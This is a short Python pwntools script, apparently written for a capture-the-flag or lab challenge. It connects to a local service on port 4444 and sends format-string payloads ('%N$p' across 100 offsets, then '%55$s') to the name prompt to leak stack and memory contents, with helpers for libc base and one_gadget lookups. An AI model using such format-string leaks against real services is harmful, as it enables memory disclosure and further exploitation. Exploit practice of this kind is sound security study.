#!/usr/bin/env python3
from pwn import *

"""

"""

context.terminal = ["tmux", "new-window"]
context.log_level = 'error'

#exe = ELF("./bin")
libc = ELF("./libc.so.6")
# rop = ROP([bin,libc])

context.arch = "amd64"
io = None

# change -l0 to -l1 for more gadgets


def one_gadget(filename, base_addr=0):
    return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]


def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val): info(name+" = %#x" % val)
def sla(delim, line): return io.sendlineafter(delim, line)
def sl(line): return io.sendline(line)
def rcu(delim): return io.recvuntil(delim)
def rcv(number): return io.recv(number)
def rcvl(): return io.recvline()


def conn():
    global io
    io = remote("127.0.0.1", 4444)
    return io


for i in range(100):
    conn()

    sla(b"Name : \n",b"%"+str(i).encode()+b"$p")
    leaks = rcvl().split(b"Desc")[0].decode()

    print(i,leaks)

    io.close()


conn()

sla(b"Name : \n",b"%55$s")
leaks = rcvl()

print(leaks)

io.close()
